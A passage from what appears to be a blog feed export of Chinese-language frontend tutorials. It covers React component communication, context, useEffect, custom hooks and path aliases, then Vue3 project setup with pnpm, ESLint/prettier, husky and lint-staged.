class="name">div</span>&gt;</span></span></span><br><span class="line">    )</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">B</span> (&#123; name &#125;) &#123;</span><br><span class="line">    <span class="keyword">return</span> (</span><br><span class="line">        <span class="language-xml"><span class="tag">&lt;<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">            this is B compnent,</span></span><br><span class="line"><span class="language-xml">            &#123;name&#125;</span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line">    )</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">App</span> () &#123;</span><br><span class="line">    <span class="keyword">const</span> [name, setName] = <span class="title function_">useState</span>(<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    <span class="keyword">const</span> <span class="title function_">getAName</span> = (<span class="params">name</span>) =&gt; &#123;</span><br><span class="line">        <span class="title function_">setName</span>(name)</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> (</span><br><span class="line">        <span class="language-xml"><span class="tag">&lt;<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">            this is App</span></span><br><span class="line"><span class="language-xml">            <span class="tag">&lt;<span class="name">A</span> <span class="attr">onGetAName</span>=<span class="string">&#123;getAName&#125;</span> /&gt;</span></span></span><br><span class="line"><span class="language-xml">            <span class="tag">&lt;<span class="name">B</span> <span class="attr">name</span>=<span class="string">&#123;name&#125;</span> /&gt;</span></span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line">    )</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="跨层组件通信"><a href="#跨层组件通信" class="headerlink" title="跨层组件通信"></a>跨层组件通信</h2><ol><li>使用createContext方法创建一个上下文对象MsgContext</li><li>在顶部组件中通过MsgContext.Provider组件提供数据</li><li>在底部组件中通过useContent钩子函数获取消费数据</li></ol><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; createContext, useContext &#125; <span class="keyword">from</span> <span class="string">&quot;react&quot;</span></span><br><span class="line">  </span><br><span class="line"><span class="keyword">const</span> <span class="title class_">MsgContext</span> = <span class="title function_">createContext</span>()</span><br><span class="line">  </span><br><span class="line"><span class="keyword">function</span> <span class="title function_">A</span> () &#123;</span><br><span class="line">    <span class="keyword">return</span> (</span><br><span class="line">        <span class="language-xml"><span class="tag">&lt;<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">            this is A component</span></span><br><span class="line"><span class="language-xml">            <span class="tag">&lt;<span class="name">B</span> /&gt;</span></span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line">    )</span><br><span class="line">&#125;</span><br><span class="line">  </span><br><span class="line"><span class="keyword">function</span> <span class="title function_">B</span> () &#123;</span><br><span class="line">    <span class="keyword">const</span> msg = <span class="title function_">useContext</span>(<span class="title class_">MsgContext</span>)</span><br><span class="line">    <span class="keyword">return</span> (</span><br><span class="line">        <span class="language-xml"><span class="tag">&lt;<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">            this is B component,&#123;msg&#125;</span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line">    )</span><br><span class="line">&#125;</span><br><span class="line">  </span><br><span class="line"><span class="keyword">function</span> <span class="title function_">App</span> () &#123;</span><br><span class="line">    <span class="keyword">const</span> msg = <span class="string">&#x27;this is app msg&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> (</span><br><span class="line">        <span class="language-xml"><span class="tag">&lt;<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">            <span class="tag">&lt;<span class="name">MsgContext.Provider</span> <span class="attr">value</span>=<span class="string">&#123;msg&#125;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">                this is App</span></span><br><span class="line"><span class="language-xml">                <span class="tag">&lt;<span class="name">A</span> /&gt;</span></span></span><br><span class="line"><span class="language-xml">            <span class="tag">&lt;/<span class="name">MsgContext.Provider</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line">    )</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="React-副作用管理-useEffect"><a href="#React-副作用管理-useEffect" class="headerlink" title="React 副作用管理-useEffect"></a>React 副作用管理-useEffect</h1><p>useEffect 是一个 React Hook 函数，用于在 React 组件中创建不是由事件引起而是由渲染本身引起的操作（副作用），比如发送 AJAX 请求、更改 DOM 等等</p><p><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/10.png" alt="10.png"></p><p>上面的组件中没有发生任何的用户事件，组件渲染完毕之后就需要和服务器要数据，整个过程属于”只由渲染引起的操作“</p><h2 id="使用方法"><a href="#使用方法" class="headerlink" title="使用方法"></a>使用方法</h2><p>在组件渲染完毕之后，立刻从服务端获取频道列表数据并显示到页面中</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_">useEffect</span>(<span class="function">() =&gt;</span> &#123; &#125;, [])</span><br></pre></td></tr></table></figure><ol><li><strong>参数1</strong>是一个函数，可以把它叫做副作用函数，在函数内部可以放置要执行的操作</li><li><strong>参数2</strong>是一个数组（可选参），在数组里放置<strong>依赖项</strong>，不同依赖项会影响第一个参数函数的执行，当是一个空数组的时候，副作用函数只会在组件渲染完毕之后执行一次</li></ol><p><strong>依赖项</strong></p><p>useEffect副作用函数的执行时机存在多种情况，根据传入依赖项的不同，会有不同的执行表现</p><table><thead><tr><th><strong>依赖项</strong></th><th><strong>副作用函数的执行时机</strong></th></tr></thead><tbody><tr><td>没有依赖项</td><td>组件初始渲染 + 组件更新时执行</td></tr><tr><td>空数组依赖</td><td>只在初始渲染时执行一次</td></tr><tr><td>添加特定依赖项</td><td>组件初始渲染 + 依赖项变化时执行</td></tr></tbody></table><p><strong>消除副作用</strong></p><p>在useEffect中编写的由渲染本身引起的对接组件外部的操作，社区也经常把它叫做副作用操作，比如在useEffect中开启了一个定时器，我们想在组件卸载时把这个定时器再清理掉，这个过程就是清理副作用</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; useEffect, useState &#125; <span class="keyword">from</span> <span class="string">&quot;react&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">Son</span> () &#123;</span><br><span class="line">    <span class="title function_">useEffect</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">        <span class="keyword">const</span> timer = <span class="built_in">setInterval</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;定时器执行中...&#x27;</span>)</span><br><span class="line">        &#125;, <span class="number">1000</span>)</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> <span class="function">() =&gt;</span> &#123;</span><br><span class="line">            <span class="built_in">clearInterval</span>(timer)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;, [])</span><br><span class="line">    <span class="keyword">return</span> <span class="language-xml"><span class="tag">&lt;<span class="name">div</span>&gt;</span>this is son<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">App</span> () &#123;</span><br><span class="line">    <span class="keyword">const</span> [show, setShow] = <span class="title function_">useState</span>(<span class="literal">true</span>)</span><br><span class="line">    <span class="keyword">return</span> (</span><br><span class="line">        <span class="language-xml"><span class="tag">&lt;<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">            &#123;show &amp;&amp; <span class="tag">&lt;<span class="name">Son</span> /&gt;</span>&#125;</span></span><br><span class="line"><span class="language-xml">            <span class="tag">&lt;<span class="name">button</span> <span class="attr">onClick</span>=<span class="string">&#123;()</span> =&gt;</span> setShow(false)&#125;&gt;卸载Son组件<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line">    )</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>消除副作用的函数最常见的执行时机是在组件卸载时自动执行</p><h1 id="自定义Hook函数"><a href="#自定义Hook函数" class="headerlink" title="自定义Hook函数"></a>自定义Hook函数</h1><p>自定义 Hook 是以 use 开头的函数，通过自定义 Hook 函数可以用来实现逻辑的封装和复用</p><ol><li>声明一个以use打头的函数</li><li>在函数体内封装可复用的逻辑（只要是可复用的逻辑）</li><li>把组件中用到的状态或者回调return出去（以对象或者数组）</li><li>在哪个组件中要用到这个逻辑，就执行这个函数，解构出来状态和回调进行使用</li></ol><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; useState &#125; <span class="keyword">from</span> <span class="string">&quot;react&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">useToggle</span> () &#123;</span><br><span class="line">    <span class="keyword">const</span> [value, setValue] = <span class="title function_">useState</span>(<span class="literal">true</span>)</span><br><span class="line">    <span class="keyword">const</span> <span class="title function_">toggle</span> = (<span class="params"></span>) =&gt; <span class="title function_">setValue</span>(!value)</span><br><span class="line">    <span class="keyword">return</span> &#123;</span><br><span class="line">        value,</span><br><span class="line">        toggle</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">App</span> () &#123;</span><br><span class="line">    <span class="keyword">const</span> &#123; value, toggle &#125; = <span class="title function_">useToggle</span>()</span><br><span class="line">    <span class="keyword">return</span> (</span><br><span class="line">        <span class="language-xml"><span class="tag">&lt;<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">            &#123;value &amp;&amp; <span class="tag">&lt;<span class="name">div</span>&gt;</span>this is div<span class="tag">&lt;/<span class="name">div</span>&gt;</span>&#125;</span></span><br><span class="line"><span class="language-xml">            <span class="tag">&lt;<span class="name">button</span> <span class="attr">onClick</span>=<span class="string">&#123;toggle&#125;</span>&gt;</span>toggle<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line">    )</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="React-Hooks-使用规则"><a href="#React-Hooks-使用规则" class="headerlink" title="React Hooks 使用规则"></a>React Hooks 使用规则</h1><ol><li>只能在组件中或者其他自定义 Hook 函数中调用</li></ol><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> [value, setValue] = <span class="title function_">useState</span>(<span class="string">&#x27;&#x27;</span>) <span class="comment">// 错误示范，不能在组件外货自定义Hook函数外调用</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">App</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> ()</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol start="2"><li>只能在组件的顶层调用，不能嵌套在if、for、其它的函数中</li></ol><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">App</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title class_">Math</span>.<span class="title function_">random</span>() &gt; <span class="number">0.5</span>) &#123;</span><br><span class="line">        <span class="keyword">const</span> [value, setValue] = <span class="title function_">useState</span>(<span class="string">&#x27;&#x27;</span>) <span class="comment">// 错误示范，不能嵌套在if、for、其它的函数中</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span>()</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="配置别名路径"><a href="#配置别名路径" class="headerlink" title="配置别名路径"></a>配置别名路径</h1><p>通过配置可以实现将<code>@/</code>解析为<code>src/</code>，可以更加方便地填写路径</p><ol><li>路径解析配置（webpack），把 <code>@/</code> 解析为 <code>src/</code></li><li>路径联想配置（VsCode），VsCode 在输入<code>@/</code>时，自动联想出来对应的 src&#x2F; 下的子级目录</li></ol><h2 id="路径解析配置"><a href="#路径解析配置" class="headerlink" title="路径解析配置"></a>路径解析配置</h2><p><strong>配置步骤</strong>：</p><ol><li>安装craco</li></ol><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm i -D @craco/craco</span><br></pre></td></tr></table></figure><ol start="2"><li>项目根目录下创建配置文件 <code>craco.config.js</code></li><li>配置文件中添加路径解析配置</li><li>包文件中配置启动和打包命令</li></ol><p><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/13.png" alt="13.png"></p><h2 id="联想路径配置"><a href="#联想路径配置" class="headerlink" title="联想路径配置"></a>联想路径配置</h2><p>配置步骤：</p><ol><li>根目录下新增配置文件<code>jsconfig.json</code></li><li>添加路径提示配置</li></ol><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;compilerOptions&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;baseUrl&quot;</span><span class="punctuation">:</span><span class="string">&quot;./&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;paths&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span></span><br><span class="line">      <span class="attr">&quot;@/*&quot;</span><span class="punctuation">:</span><span class="punctuation">[</span></span><br><span class="line">        <span class="string">&quot;src/*&quot;</span></span><br><span class="line">      <span class="punctuation">]</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line">  <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 前端开发 </category>
          
          <category> React </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 前端 </tag>
            
            <tag> react </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Vue3-项目配置</title>
      <link href="/2024/04/08/Vue3-%E9%A1%B9%E7%9B%AE%E9%85%8D%E7%BD%AE/"/>
      <url>/2024/04/08/Vue3-%E9%A1%B9%E7%9B%AE%E9%85%8D%E7%BD%AE/</url>
      
        <content type="html"><![CDATA[<h1 id="pnpm-包管理器-创建项目"><a href="#pnpm-包管理器-创建项目" class="headerlink" title="pnpm 包管理器-创建项目"></a>pnpm 包管理器-创建项目</h1><p><a href="%5Bhttps://www.pnpm.cn/%5D(https://www.pnpm.cn/)">pnpm 包管理器</a></p><p>优势：比同类工具快 2倍 左右，同时节省磁盘空间</p><p>安装方式：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">npm install -g pnpm</span></span><br></pre></td></tr></table></figure><p>创建项目：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">pnpm create vue</span></span><br></pre></td></tr></table></figure><p><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/image-20230710172832242.png" alt="image-20230710172832242.png"></p><h1 id="ESLint-prettier-配置代码风格"><a href="#ESLint-prettier-配置代码风格" class="headerlink" title="ESLint &amp; prettier 配置代码风格"></a>ESLint &amp; prettier 配置代码风格</h1><p><strong>环境同步</strong>：</p><ol><li>安装插件 ESlint， 开启保持自动修复</li><li>禁用了插件 Prettier，并关闭保存自动格式化</li></ol><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// ESlint插件 + Vscode配置 实现自动格式化修复</span></span><br><span class="line"><span class="comment">// 当保存的时候，eslint自动帮我们修复错误</span></span><br><span class="line"><span class="attr">&quot;editor.codeActionsOnSave&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;source.fixAll&quot;</span><span class="punctuation">:</span> <span class="string">&quot;explicit&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line"><span class="comment">// 保存代码，不自动格式化</span></span><br><span class="line"><span class="attr">&quot;editor.formatOnSave&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">false</span></span><span class="punctuation">,</span></span><br><span class="line"><span class="attr">&quot;workbench.iconTheme&quot;</span><span class="punctuation">:</span> <span class="string">&quot;vscode-icons&quot;</span></span><br></pre></td></tr></table></figure><p><strong>配置文件 .eslintrc.cjs</strong>：</p><ol><li>prettier 风格配置 <a href="https://prettier.io/docs/en/options.html">https://prettier.io</a><ol><li>单引号</li><li>不使用分号</li><li>每行宽度至多80字符</li><li>不加对象|数组最后逗号</li><li>换行符号不限制（win mac 不一致）</li></ol></li><li>vue组件名称多单词组成（忽略index.vue）</li><li>props解构（关闭）</li></ol><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">rules</span>: &#123;</span><br><span class="line">    <span class="comment">// Eslint代码风格美化</span></span><br><span class="line">    <span class="comment">// 1. 禁用格式化插件 prettier  format on save 关闭</span></span><br><span class="line">    <span class="comment">// 2. 安装Eslint插件，并配置保存时自动修复</span></span><br><span class="line">    <span class="string">&#x27;prettier/prettier&#x27;</span>: [</span><br><span class="line">        <span class="string">&#x27;warn&#x27;</span>,</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="attr">singleQuote</span>: <span class="literal">true</span>, <span class="comment">// 单引号</span></span><br><span class="line">            <span class="attr">semi</span>: <span class="literal">false</span>, <span class="comment">// 无分号</span></span><br><span class="line">            <span class="attr">printWidth</span>: <span class="number">80</span>, <span class="comment">// 每行宽度至多80字符</span></span><br><span class="line">            <span class="attr">trailingComma</span>: <span class="string">&#x27;none&#x27;</span>, <span class="comment">// 不加对象|数组最后逗号</span></span><br><span class="line">            <span class="attr">endOfLine</span>: <span class="string">&#x27;auto&#x27;</span> <span class="comment">// 换行符号不限制（win mac 不一致）</span></span><br><span class="line">        &#125;</span><br><span class="line">    ],</span><br><span class="line">    <span class="string">&#x27;vue/multi-word-component-names&#x27;</span>: [</span><br><span class="line">        <span class="string">&#x27;warn&#x27;</span>,</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="attr">ignores</span>: [<span class="string">&#x27;index&#x27;</span>] <span class="comment">// vue组件名称多单词组成（忽略index.vue）</span></span><br><span class="line">        &#125;</span><br><span class="line">    ],</span><br><span class="line">    <span class="string">&#x27;vue/no-setup-props-destructure&#x27;</span>: [<span class="string">&#x27;off&#x27;</span>], <span class="comment">// 关闭 props 解构的校验</span></span><br><span class="line">    <span class="comment">// 💡 添加未定义变量错误提示，create-vue@3.6.3 关闭，这里加上是为了支持下一个章节演示。</span></span><br><span class="line">    <span class="string">&#x27;no-undef&#x27;</span>: <span class="string">&#x27;error&#x27;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="基于-husky-的代码检查工作流"><a href="#基于-husky-的代码检查工作流" class="headerlink" title="基于 husky 的代码检查工作流"></a>基于 husky 的代码检查工作流</h1><p>husky 是一个 git hooks 工具 ( git的钩子工具，可以在特定时机执行特定的命令 )</p><p><strong>husky 配置</strong></p><ol><li>git初始化 git init</li><li>初始化 husky 工具配置 <a href="https://typicode.github.io/husky/">https://typicode.github.io/husky/</a></li></ol><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">pnpm dlx husky-init &amp;&amp; pnpm install</span></span><br></pre></td></tr></table></figure><ol start="3"><li>修改 .husky&#x2F;pre-commit 文件</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pnpm lint</span><br></pre></td></tr></table></figure><p><strong>问题：</strong> 默认进行的是全量检查，耗时问题，历史问题。</p><p><strong>lint-staged 配置</strong></p><ol><li>安装</li></ol><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">pnpm i lint-staged -D</span></span><br></pre></td></tr></table></figure><ol start="2"><li>配置 <code>package.json</code></li></ol><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;vue3-eventadmin&quot;</span><span class="punctuation">,</span> <span class="comment">// 自定义项目名称</span></span><br><span class="line">  <span class="comment">// 省略...</span></span><br><span class="line">  <span class="attr">&quot;scripts&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="comment">// 省略...</span></span><br><span class="line">    <span class="attr">&quot;lint-staged&quot;</span><span class="punctuation">:</span> <span class="string">&quot;lint-staged&quot;</span></span><br><span class="line">  <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="comment">// 省略...</span></span><br><span class="line">  <span class="attr">&quot;lint-staged&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;*.&#123;js,ts,vue&#125;&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">      <span class="string">&quot;eslint --fix&quot;</span></span><br><span class="line">    <span class="punctuation">]</span></span><br><span class="line">  <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><ol start="3"><li>修改 .husky&#x2F;pre-commit 文件</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/usr/bin/env sh</span></span><br><span class="line">. <span class="string">&quot;<span class="subst">$(dirname -- <span class="string">&quot;<span class="variable">$0</span>&quot;</span>)</span>/_/husky.sh&quot;</span></span><br><span class="line">  </span><br><span class="line">yarn lint-staged</span><br><span class="line"><span class="comment"># pnpm lint-staged</span></span><br></pre></td></tr></table></figure><h1 id="调整项目目录"><a href="#调整项目目录" class="headerlink" title="调整项目目录"></a>调整项目目录</h1><p>默认生成的目录结构不符合项目的需求，需要对其进行自定义改动</p><ol><li><p>删除初始化的默认文件，包括assets、components、stores、views内的不需要的文件</p></li><li><p>修改剩余代码内容</p></li></ol><p><code>src/router/index.js</code></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; createRouter, createWebHistory &#125; <span class="keyword">from</span> <span class="string">&#x27;vue-router&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> router = <span class="title function_">createRouter</span>(&#123;</span><br><span class="line">    <span class="attr">history</span>: <span class="title function_">createWebHistory</span>(<span class="keyword">import</span>.<span class="property">meta</span>.<span class="property">env</span>.<span class="property">BASE_URL</span>),</span><br><span class="line">    <span class="attr">routes</span>: []</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> router</span><br></pre></td></tr></table></figure><p><code>src/App.vue</code></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">setup</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">template</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">router-view</span>&gt;</span><span class="tag">&lt;/<span class="name">router-view</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">template</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">style</span> <span class="attr">scoped</span>&gt;</span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br></pre></td></tr></table></figure><p><code>src/main.js</code></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; createApp &#125; <span class="keyword">from</span> <span class="string">&#x27;vue&#x27;</span></span><br><span class="line"><span class="keyword">import</span> &#123; createPinia &#125; <span class="keyword">from</span> <span class="string">&#x27;pinia&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="title class_">App</span> <span class="keyword">from</span> <span class="string">&#x27;./App.vue&#x27;</span></span><br><span class="line"><span class="keyword">import</span> router <span class="keyword">from</span> <span class="string">&#x27;./router&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> app = <span class="title function_">createApp</span>(<span class="title class_">App</span>)</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">use</span>(<span class="title function_">createPinia</span>())</span><br><span class="line">app.<span class="title function_">use</span>(router)</span><br><span class="line">app.<span class="title function_">mount</span>(<span class="string">&#x27;#app&#x27;</span>)</span><br></pre></td></tr></table></figure><ol start="3"><li>新增调整需要的目录结构</li></ol><p>新建 api 文件夹、 utils 文件夹</p><p><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20240408160820.png" alt="image.png"></p><ol start="4"><li>拷贝初始化资源文件、安装预处理器插件</li></ol><p>将项目需要的全局样式 和 图片文件，复制到 assets 文件夹中, 并将全局样式在main.js中引入</p><figure 